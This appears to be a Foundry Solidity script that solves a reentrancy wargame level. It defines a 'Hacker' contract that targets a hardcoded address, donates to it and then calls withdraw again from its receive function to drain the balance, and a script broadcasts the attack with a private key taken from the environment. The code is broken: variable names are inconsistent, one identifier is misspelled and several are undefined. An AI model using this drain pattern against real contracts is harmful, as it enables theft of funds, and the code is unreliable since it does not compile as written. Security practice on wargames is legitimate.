pragma solidity ^0.6.0;

import "../src/Reentrancy.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Hacker {

    
    Reentrancy public reentrancyInstance = Reentrancy(0xC2D4576Ad8b9D1a7f5c353037286bEFa31f3689C);

    constructor() public payable {
        reentranceInstance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentranceInstance.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value:_amount}("");
        require(resuult);
    }


    receive() external  payable {
        reentranceInstance.withdraw(0.001 ether);
    }



}

contract ReentrancySolution is Script {


    constructor() public payable {
        reentrancyInstance.donate{value: 0.001 ether}(address(this));
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        Hacker hacker = new Hacker{value: 0.001 ether}();
        hacker.withdraw();

        vm.stopBroadcast();
    }
}
